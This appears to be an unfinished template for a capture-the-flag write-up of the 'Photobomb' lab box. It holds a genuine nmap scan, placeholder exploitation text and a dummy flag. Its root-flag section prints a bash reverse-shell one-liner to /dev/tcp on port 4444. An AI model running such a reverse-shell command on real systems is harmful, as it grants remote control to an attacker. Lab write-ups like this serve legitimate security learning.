# Information Gathering

## IP = 10.129.222.78

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```bash
┌─[wivdos@parrot]─[~/recon/Photobomb] 
└──╼ $ nmap -sVC photobomb.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 23:34 BST
Nmap scan report for photobomb.htb (10.129.222.78)
Host is up (0.0087s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```
From the above output we can see that ports, **22** and **80** are the ports open. 


![Credentials](images/Screenshot2022-10-09233801.png)
**Figure 1:** Contains credentials to endpoints


# Exploitation  
In order to gain our initial foothold we need to blablablabla. 
**EITHER LINK TO CODE OR LINK TO CODE + CHANGED SECTION**

```python
print("[+] Exploited System!")
```


## User Flag
In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag
The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
**Figure :** ....


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [GOOGLE](https://google.co.uk)